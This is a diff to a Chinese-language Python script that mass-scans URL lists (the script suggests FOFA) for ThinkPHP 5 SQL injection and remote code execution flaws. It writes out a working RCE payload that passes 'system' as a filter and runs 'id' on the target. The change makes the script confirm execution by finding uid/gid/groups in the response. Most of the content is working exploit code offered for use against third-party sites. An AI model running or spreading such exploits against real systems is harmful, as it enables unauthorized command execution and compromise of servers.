@@ -28,7 +28,7 @@ def ThinkPHP5_SQL_Injection(url): #ThinkPHP5 SQL Injection
         soup = etree.HTML(respon)
         result = soup.xpath('//tbody//text()')
     except Exception as Error:
-        print("如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞")
+        print("如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞\n")
         return
     list = []
     for i in result:
@@ -40,10 +40,10 @@ def ThinkPHP5_SQL_Injection(url): #ThinkPHP5 SQL Injection
         Num=list.index('type')
         list=list[Num:Num+10:1]
     except Exception as Error:
-        print("未检测出ThinkPHP5 SQL Injection漏洞，有WAF或者其他原因，请手动访问payload验证！")
+        print("未检测出ThinkPHP5 SQL Injection漏洞，有WAF或者其他原因，请手动访问payload验证！\n")
         return 0
     if len(list) ==0:
-        print("未检测出ThinkPHP5 SQL Injection漏洞，有WAF或者其他原因，请手动访问payload验证！")
+        print("未检测出ThinkPHP5 SQL Injection漏洞，有WAF或者其他原因，请手动访问payload验证！\n")
     else:
         print("ThinkPHP5 SQL Injection漏洞存在！\n")
         print(list)
@@ -69,13 +69,13 @@ def ThinkPHP_5_rce(url):    #Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulne
         respon = requests.get(payload, headers=header).content.decode('utf-8')
         #print(respon)
     except Exception as ERROR:
-        print('如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞')
+        print('如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞\n')
         return 0
     if "PHP Version" in respon:
-        print("Thinkphp5 5.0.22/5.1.29 Remote Code Execution漏洞存在,访问payload即可查看PHPinfo信息")
+        print("Thinkphp5 5.0.22/5.1.29 Remote Code Execution漏洞存在,访问payload即可查看PHPinfo信息\n")
         return 1
     else:
-        print("未发现Thinkphp5 5.0.22/5.1.29 Remote Code Execution漏洞，或者存在WAF，请手动访问payload验证！")
+        print("未发现Thinkphp5 5.0.22/5.1.29 Remote Code Execution漏洞，或者存在WAF，请手动访问payload验证！\n")
 
 def ThinkPHP_5_0_23_rce(url):#ThinkPHP5 5.0.23 Remote Code Execution Vulnerability
     print("正在检测ThinkPHP5 5.0.23 Remote Code Execution Vulnerability ->" + url)
@@ -97,17 +97,17 @@ def ThinkPHP_5_0_23_rce(url):#ThinkPHP5 5.0.23 Remote Code Execution Vulnerabili
         "_method" : "__construct", "filter[]" : "system" , "method" : "get" , "server[REQUEST_METHOD]" : "id"
     }
     try :
-        respon=requests.post(payload,data=data).status_code
+        respon=requests.post(payload,data=data).text
         #result=requests.post(payload,data=data).content.decode('utf-8')
         #print(result)
     except Exception as Error:
-        print('如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞')
+        print('如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞\n')
         return 0
-    if respon == 200:
-        print("ThinkPHP5 5.0.23 Remote Code Execution漏洞存在！")
+    if "uid" in respon and "gid" in respon and "groups" in respon:
+        print("ThinkPHP5 5.0.23 Remote Code Execution漏洞存在！\n")
         return 1
     else :
-        print("未发现ThinkPHP5 5.0.23 Remote Code Execution漏洞，或者存在WAF，请手动访问payload验证！")
+        print("未发现ThinkPHP5 5.0.23 Remote Code Execution漏洞，或者存在WAF，请手动访问payload验证！\n")
 
 if __name__ == '__main__':
     print("批量URL检测(默认打开当前目录下的url.txt,可搭配fofa使用) -> 1 \n"+"单个URL检测 -> 2 \n")
@@ -117,6 +117,7 @@ if __name__ == '__main__':
             print("欢迎使用thinkPHP漏洞验证脚本\n" + "小孩子才做选择，我全都要！ -> 0\n" + "ThinkPHP5_SQL_Injection -> 1\n" + "ThinkPHP_5_rce -> 2\n" + "ThinkPHP_5_0_23_rce -> 3\n")
             def_Num = int(input("请输入你的选择："))
             for url in open('url.txt'):
+                url = url.replace('\n', '')
                 with open(r'ThinkPHP_vuln.txt', 'a+') as f:
                     if def_Num == 0:
                         if ThinkPHP5_SQL_Injection(url) ==1:
